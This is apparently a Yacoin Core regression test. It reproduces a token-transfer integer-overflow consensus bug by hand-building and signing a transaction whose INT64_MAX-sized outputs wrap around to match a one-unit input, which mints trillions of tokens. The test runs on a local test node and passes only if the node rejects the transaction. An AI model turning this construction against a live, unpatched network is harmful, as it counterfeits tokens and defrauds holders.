#!/usr/bin/env python3
# Copyright (c) 2026 The Yacoin Core developers
# Distributed under the MIT software license, see the accompanying
# file COPYING or http://www.opensource.org/licenses/mit-license.php.
"""Reproduce the Token Transfer Quantity Overflow consensus bug.

Consensus::CheckTxTokens (src/consensus/tx_verify.cpp) enforces that, for every
token, the sum of transfer-output amounts equals the sum of input amounts, so
tokens can be neither created nor burned. It accumulates those sums into signed
64-bit integers (CAmount) with no per-amount or running-total bounds. The only
per-amount check reached on the transfer path, ContextualCheckTransferToken,
rejects amounts <= 0 but has no upper bound.

An attacker who holds a single base unit of a maximally-divisible token
(units = 6, which makes CheckAmountWithUnits a no-op) can therefore build a
transfer whose outputs individually stay positive but whose signed sum wraps
around 2^64 back to the input total:

    output 1 amount = INT64_MAX  (9223372036854775807)
    output 2 amount = INT64_MAX  (9223372036854775807)
    output 3 amount = 3

    INT64_MAX + INT64_MAX + 3  ==  2^64 + 1  ==  1   (mod 2^64)

Every output is > 0 (passes ContextualCheckTransferToken) and the wrapped total
equals the 1-base-unit input, so the inputs==outputs check passes. Two outputs
worth ~9.2e12 whole tokens are minted from one base unit.

This test builds that transaction by hand (the wallet RPCs will not emit
out-of-range amounts) and submits it:

  * Vulnerable node: sendrawtransaction ACCEPTS it. The test then mines it and
    shows the minted UTXOs via listunspent, and FAILS (this is the regression
    signal).
  * Fixed node: sendrawtransaction REJECTS it with a "toolarge" reason and the
    test PASSES.
"""

import struct
from decimal import Decimal

from test_framework.blocktools import TIME_GENESIS_BLOCK
from test_framework.key import ECKey
from test_framework.messages import CTransaction, CTxIn, CTxOut, COutPoint, hash256, ser_string
from test_framework.script import CScript, OP_DROP, OP_NOP4  # OP_NOP4 == OP_YAC_TOKEN
from test_framework.test_framework import BitcoinTestFramework
from test_framework.util import assert_equal, JSONRPCException

SIGHASH_ALL = 1
SEQUENCE_FINAL = 0xffffffff
_B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"


def decode_wif(wif):
    """Decode a base58check WIF string to (32-byte secret, compressed flag)."""
    n = 0
    for ch in wif:
        n = n * 58 + _B58.index(ch)
    raw = n.to_bytes((n.bit_length() + 7) // 8, "big")
    raw = b"\x00" * (len(wif) - len(wif.lstrip("1"))) + raw
    payload = raw[1:-4]  # drop 1 version byte and the 4-byte checksum
    if len(payload) == 33 and payload[-1] == 1:
        return payload[:32], True
    return payload, False


def sighash_all(tx, in_idx, script_code):
    """Legacy SIGHASH_ALL digest, matching yacoin's nTime-extended serialization.

    yacoin serializes nVersion, nTime (64-bit for tx version >= 2), vin, vout,
    nLockTime, then appends the 4-byte hash type before double-SHA256 - exactly
    what CTransaction.serialize() produces here.
    """
    txtmp = CTransaction()
    txtmp.nVersion = tx.nVersion
    txtmp.nTime = tx.nTime
    txtmp.nLockTime = tx.nLockTime
    txtmp.vin = [
        CTxIn(vi.prevout, script_code if i == in_idx else b"", vi.nSequence)
        for i, vi in enumerate(tx.vin)
    ]
    txtmp.vout = tx.vout
    return hash256(txtmp.serialize() + struct.pack("<I", SIGHASH_ALL))


def sign_input(tx, in_idx, script_code_hex, wif):
    """Sign one P2PKH-style input (plain or token) with an explicit key.

    The wallet's signrawtransaction cannot sign token inputs (CombineSignatures
    has no token case and discards the signature), so inputs are signed here.
    """
    secret, compressed = decode_wif(wif)
    key = ECKey()
    key.set(secret, compressed)
    digest = sighash_all(tx, in_idx, CScript(bytes.fromhex(script_code_hex)))
    sig = key.sign_ecdsa(digest) + bytes([SIGHASH_ALL])
    tx.vin[in_idx].scriptSig = CScript([sig, key.get_pubkey().get_bytes()])

# Consensus constants, mirrored from the C++ source.
COIN = 1000000                       # src/amount.h
MAX_MONEY = 2000000000 * COIN        # src/amount.h
INT64_MAX = 2**63 - 1                # 9223372036854775807
TOKEN = "OVERFLOW"
OP_YAC_TOKEN = OP_NOP4               # src/script/script.h: OP_YAC_TOKEN = OP_NOP4
P2PKH_LEN = 25                       # OP_DUP OP_HASH160 <20> OP_EQUALVERIFY OP_CHECKSIG

# Fee (in satoshis) taken from a separate YAC input. Token transfer outputs must
# carry 0 YAC, so fees cannot come from the token UTXO.
FEE = 100000  # 0.1 YAC


def token_transfer_script(p2pkh_prefix, name, amount):
    """Build a token transfer output script for `amount` base units of `name`.

    Layout matches CTokenTransfer::ConstructTransaction:
        <25-byte P2PKH> OP_YAC_TOKEN <push "yact" || name || int64(amount)> OP_DROP
    The P2PKH prefix is reused from an existing UTXO so no address decoding is
    needed. `amount` is written as a raw signed 64-bit little-endian integer,
    exactly how CTokenTransfer serializes nAmount.
    """
    payload = b"yact" + ser_string(name.encode()) + struct.pack("<q", amount)
    assert len(payload) < 76, "payload must use a single-byte direct push"
    return CScript(
        bytes(p2pkh_prefix)
        + bytes([OP_YAC_TOKEN, len(payload)])
        + payload
        + bytes([OP_DROP])
    )


class TokenOverflowTest(BitcoinTestFramework):
    def set_test_params(self):
        self.num_nodes = 1
        self.setup_clean_chain = True
        self.supports_cli = False
        self.mocktime = TIME_GENESIS_BLOCK
        self.extra_args = [
            ["-tokenindex=1", "-addressindex=1", "-tokenSupportBlockNumber=10"],
        ]

    def mine_blocks(self, count):
        # Advance mocktime per block so timestamps are monotonic and accepted.
        for _ in range(count):
            self.nodes[0].setmocktime(self.mocktime)
            self.nodes[0].generate(1)
            self.mocktime += 60

    def run_test(self):
        n0 = self.nodes[0]

        self.log.info("Mining to activate tokens (block 10) and mature coinbase")
        self.mine_blocks(30)

        self.log.info("Issuing a maximally-divisible token (units=6)")
        issue_addr = n0.getnewaddress()
        n0.issue(TOKEN, 1000, 6, True, False, "", issue_addr, "")
        self.mine_blocks(5)
        assert_equal(n0.listtokens(TOKEN, True)[TOKEN]["units"], 6)

        self.log.info("Placing exactly 1 base unit of the token on a fresh address")
        victim_addr = n0.getnewaddress()
        # units=6, COIN=1e6  =>  1 base unit == 0.000001 whole tokens.
        n0.transfer(TOKEN, Decimal("0.000001"), victim_addr)
        self.mine_blocks(1)

        # Locate the single token UTXO holding 1 base unit.
        tok_utxos = n0.getaddressutxos({"addresses": [victim_addr], "tokenName": TOKEN})
        assert_equal(len(tok_utxos), 1)
        tok = tok_utxos[0]
        # For a token-filtered query the addressindex reports the token amount here,
        # so 1 confirms this is the 1-base-unit UTXO. (The output's YAC nValue is 0.)
        assert_equal(tok["satoshis"], 1)
        tok_script = bytes.fromhex(tok["script"])
        p2pkh_prefix = tok_script[:P2PKH_LEN]  # reuse victim_addr's P2PKH prefix

        # Pick a plain YAC UTXO (no token) to pay the fee.
        yac = max(
            (u for u in n0.listunspent(1) if "token_name" not in u),
            key=lambda u: u["amount"],
        )
        yac_value = int(round(yac["amount"] * COIN))
        change = yac_value - FEE
        assert change > 0

        self.log.info("Building the overflow transfer: outputs INT64_MAX + INT64_MAX + 3")
        tx = CTransaction()
        tx.nVersion = 2                 # 64-bit nTime tx format
        tx.nTime = self.mocktime
        tx.vin = [
            CTxIn(COutPoint(int(tok["txid"], 16), tok["outputIndex"]), nSequence=SEQUENCE_FINAL),
            CTxIn(COutPoint(int(yac["txid"], 16), yac["vout"]), nSequence=SEQUENCE_FINAL),
        ]
        tx.vout = [
            CTxOut(0, token_transfer_script(p2pkh_prefix, TOKEN, INT64_MAX)),
            CTxOut(0, token_transfer_script(p2pkh_prefix, TOKEN, INT64_MAX)),
            CTxOut(0, token_transfer_script(p2pkh_prefix, TOKEN, 3)),
            CTxOut(change, CScript(bytes.fromhex(yac["scriptPubKey"]))),
        ]

        wrapped = (INT64_MAX + INT64_MAX + 3) & (2**64 - 1)
        self.log.info("  Sum of outputs mod 2^64 = %d (input total = 1 base unit)", wrapped)
        assert_equal(wrapped, 1)

        # Sign the token input and the YAC fee input with their own keys.
        sign_input(tx, 0, tok["script"], n0.dumpprivkey(victim_addr)["private_key"])
        sign_input(tx, 1, yac["scriptPubKey"], n0.dumpprivkey(yac["address"])["private_key"])
        signed_hex = tx.serialize().hex()

        self.log.info("Submitting the overflow transaction")
        try:
            txid = n0.sendrawtransaction(signed_hex)
        except JSONRPCException as e:
            if "toolarge" in e.error["message"] or "negative" in e.error["message"]:
                self.log.info("Node REJECTED the overflow transfer: %s", e.error["message"])
                self.log.info("Not vulnerable to Token Transfer Quantity Overflow. PASS.")
                return
            raise

        # If we get here, the node accepted a transaction that mints tokens from
        # a single base unit. Acceptance alone proves the vulnerability; mine it
        # and read back the individual minted UTXOs as concrete evidence.
        self.log.error("*** BUG REPRODUCED: overflow transfer ACCEPTED (txid %s) ***", txid)
        self.mine_blocks(1)
        # For a token-filtered query, getaddressutxos reports each UTXO's token
        # amount in "satoshis" as an integer, so out-of-range values are unambiguous.
        minted = n0.getaddressutxos({"addresses": [victim_addr], "tokenName": TOKEN})
        for u in minted:
            self.log.error("  minted UTXO %s:%d holds %d base units of %s (MAX_MONEY=%d)",
                           u["txid"], u["outputIndex"], u["satoshis"], TOKEN, MAX_MONEY)
        assert any(u["satoshis"] > MAX_MONEY for u in minted), \
            "expected at least one out-of-range minted UTXO"
        raise AssertionError(
            "VULNERABLE: Token Transfer Quantity Overflow reproduced - tokens minted from 1 base unit"
        )


if __name__ == "__main__":
    TokenOverflowTest().main()
